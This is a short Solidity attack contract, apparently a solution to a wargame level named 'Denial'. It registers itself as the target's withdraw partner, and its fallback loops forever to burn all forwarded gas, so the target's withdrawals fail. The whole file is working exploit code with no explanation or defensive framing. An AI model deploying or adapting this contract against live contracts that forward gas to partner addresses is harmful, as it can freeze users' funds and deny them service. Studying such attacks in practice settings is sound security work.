// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address) external;
}

contract AttackDenial {
    constructor(IDenial target) {
        target.setWithdrawPartner(address(this));
    }

    // Burn all the gas to deny service
    fallback() external payable {
        while (true) {}
    }
}
